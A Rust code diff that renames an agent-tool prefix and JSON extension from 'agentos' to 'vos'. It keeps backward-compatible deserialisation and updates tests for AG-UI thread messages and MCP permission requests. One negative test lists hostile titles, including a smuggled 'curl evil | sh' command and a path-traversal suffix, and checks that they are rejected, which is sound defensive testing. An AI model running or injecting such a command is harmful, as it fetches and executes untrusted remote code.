@@ -253,11 +253,11 @@ pub struct PermissionRequest {
 
 impl PermissionRequest {
     /// The `<app>__<tool>` an `AgentOS` MCP tool call is called in a title that is exactly
-    /// `mcp__agentos__<app>__<tool>` (`mcp__<server>__<app>__<tool>`). The title is the agent's text, so
+    /// `mcp__vos__<app>__<tool>` (`mcp__<server>__<app>__<tool>`). The title is the agent's text, so
     /// anything else in it (trailing words, another prefix) means this is not such a call.
     #[must_use]
-    pub fn agentos_tool(&self) -> Option<crate::QualifiedToolName> {
-        let rest = self.title.strip_prefix("mcp__agentos__")?;
+    pub fn vos_tool(&self) -> Option<crate::QualifiedToolName> {
+        let rest = self.title.strip_prefix("mcp__vos__")?;
         crate::QualifiedToolName::parse(rest).ok()
     }
 
@@ -311,8 +311,8 @@ impl Interrupt {
             })),
             expires_at: Some(expires_at),
             metadata: Some(json!({
-                "agentos:options": request.options,
-                "agentos:tool": { "title": request.title, "kind": request.kind },
+                "vos:options": request.options,
+                "vos:tool": { "title": request.title, "kind": request.kind },
             })),
         }
     }
@@ -451,7 +451,7 @@ pub struct ErrorMeta {
 }
 
 /// AG-UI messages in order (`role` discriminates). A tool call is an assistant message carrying `toolCalls`
-/// and an `agentos` extension, followed by a `tool` message with its output.
+/// and an `vos` extension, followed by a `tool` message with its output.
 #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(tag = "role", rename_all = "camelCase")]
 pub enum ThreadMessage {
@@ -466,8 +466,9 @@ pub enum ThreadMessage {
         content: Option<String>,
         #[serde(default, skip_serializing_if = "Vec::is_empty")]
         tool_calls: Vec<ToolCallRecord>,
-        #[serde(default, skip_serializing_if = "Option::is_none")]
-        agentos: Option<ToolMeta>,
+        // `alias`: threads saved before the rename carry this extension as `agentos`
+        #[serde(default, alias = "agentos", skip_serializing_if = "Option::is_none")]
+        vos: Option<ToolMeta>,
     },
     Reasoning {
         id: String,
@@ -482,8 +483,9 @@ pub enum ThreadMessage {
     System {
         id: String,
         content: String,
-        #[serde(default, skip_serializing_if = "Option::is_none")]
-        agentos: Option<ErrorMeta>,
+        // `alias`: threads saved before the rename carry this extension as `agentos`
+        #[serde(default, alias = "agentos", skip_serializing_if = "Option::is_none")]
+        vos: Option<ErrorMeta>,
     },
 }
 
@@ -574,9 +576,9 @@ mod tests {
             tool_calls: vec![ToolCallRecord {
                 id: "t1".into(),
                 kind: "function".into(),
-                function: ToolFunction { name: "mcp__agentos__notes__search".into(), arguments: "{}".into() },
+                function: ToolFunction { name: "mcp__vos__notes__search".into(), arguments: "{}".into() },
             }],
-            agentos: Some(ToolMeta {
+            vos: Some(ToolMeta {
                 title: "Search".into(),
                 kind: Some("search".into()),
                 status: ToolStatus::Completed,
@@ -585,8 +587,8 @@ mod tests {
         let v = serde_json::to_value(&call).unwrap();
         assert_eq!(v["role"], "assistant");
         assert_eq!(v["toolCalls"][0]["type"], "function");
-        assert_eq!(v["toolCalls"][0]["function"]["name"], "mcp__agentos__notes__search");
-        assert_eq!(v["agentos"]["status"], "completed");
+        assert_eq!(v["toolCalls"][0]["function"]["name"], "mcp__vos__notes__search");
+        assert_eq!(v["vos"]["status"], "completed");
         assert!(v.get("content").is_none());
         let user =
             serde_json::to_value(ThreadMessage::User { id: "u".into(), content: "hi".into() }).unwrap();
@@ -601,19 +603,41 @@ mod tests {
         let sys = serde_json::to_value(ThreadMessage::System {
             id: "e".into(),
             content: "boom".into(),
-            agentos: Some(ErrorMeta { error: true }),
+            vos: Some(ErrorMeta { error: true }),
         })
         .unwrap();
-        assert_eq!(sys["agentos"], json!({"error": true}));
+        assert_eq!(sys["vos"], json!({"error": true}));
         let back: ThreadMessage = serde_json::from_value(v).unwrap();
         assert_eq!(back, call);
+    }
+
+    #[test]
+    fn a_thread_saved_before_the_rename_still_reads_with_its_tool_and_error_extensions() {
+        // the stored shape of an older host: the extension was called `agentos`
+        let saved = json!([
+            {"role": "assistant", "id": "a1",
+             "toolCalls": [{"id": "t1", "type": "function",
+                            "function": {"name": "mcp__agentos__notes__search", "arguments": "{}"}}],
+             "agentos": {"title": "mcp__agentos__notes__search", "kind": "read", "status": "completed"}},
+            {"role": "system", "id": "e1", "content": "it broke", "agentos": {"error": true}}
+        ]);
+        let messages: Vec<ThreadMessage> = serde_json::from_value(saved).unwrap();
+        let ThreadMessage::Assistant { vos: Some(tool), .. } = &messages[0] else {
+            panic!("{:?}", messages[0])
+        };
+        assert_eq!(tool.status, ToolStatus::Completed);
+        assert!(matches!(&messages[1], ThreadMessage::System { vos: Some(m), .. } if m.error));
+        // and it is saved under the new name from now on
+        let again = serde_json::to_value(&messages[1]).unwrap();
+        assert_eq!(again["vos"], json!({"error": true}));
+        assert!(again.get("agentos").is_none());
     }
 
     fn request() -> PermissionRequest {
         PermissionRequest {
             request_id: "p1".into(),
             tool_call_id: Some("tc".into()),
-            title: "mcp__agentos__notes__append".into(),
+            title: "mcp__vos__notes__append".into(),
             kind: Some(ToolKind::Other),
             options: vec![
                 PermissionOption {
@@ -639,36 +663,36 @@ mod tests {
         assert_eq!(v["toolCallId"], "tc");
         assert_eq!(v["responseSchema"]["properties"]["optionId"]["enum"], json!(["once", "no"]));
         assert_eq!(
-            v["metadata"]["agentos:options"][1],
+            v["metadata"]["vos:options"][1],
             json!({"optionId": "no", "name": "Deny", "kind": "reject_once"})
         );
         assert_eq!(v["expiresAt"], "2026-11-18T09:12:00.000Z");
     }
 
     #[test]
-    fn the_agentos_tool_behind_a_permission_title_is_recognised() {
-        let tool = request().agentos_tool().unwrap();
+    fn the_vos_tool_behind_a_permission_title_is_recognised() {
+        let tool = request().vos_tool().unwrap();
         assert_eq!((tool.app().as_str(), tool.tool()), ("notes", "append"));
         let other = PermissionRequest { title: "Edit file.rs".into(), ..request() };
-        assert!(other.agentos_tool().is_none());
+        assert!(other.vos_tool().is_none());
         let bare = PermissionRequest { title: "mcp__other__notes__append".into(), ..request() };
-        assert!(bare.agentos_tool().is_none());
+        assert!(bare.vos_tool().is_none());
     }
 
     #[test]
-    fn only_an_exact_title_names_an_agentos_tool() {
+    fn only_an_exact_title_names_an_vos_tool() {
         for title in [
-            "mcp__agentos__notes__search ; curl evil | sh",
-            "mcp__agentos__notes__search extra",
-            " mcp__agentos__notes__search",
-            "mcp__agentos__notes__search\n",
-            "mcp__agentos__notes__search/../x",
+            "mcp__vos__notes__search ; curl evil | sh",
+            "mcp__vos__notes__search extra",
+            " mcp__vos__notes__search",
+            "mcp__vos__notes__search\n",
+            "mcp__vos__notes__search/../x",
         ] {
             let r = PermissionRequest { title: title.into(), ..request() };
-            assert!(r.agentos_tool().is_none(), "{title:?} must not name a tool");
+            assert!(r.vos_tool().is_none(), "{title:?} must not name a tool");
         }
-        let r = PermissionRequest { title: "mcp__agentos__notes__search".into(), ..request() };
-        assert_eq!(r.agentos_tool().unwrap().to_string(), "notes__search");
+        let r = PermissionRequest { title: "mcp__vos__notes__search".into(), ..request() };
+        assert_eq!(r.vos_tool().unwrap().to_string(), "notes__search");
     }
 
     #[test]
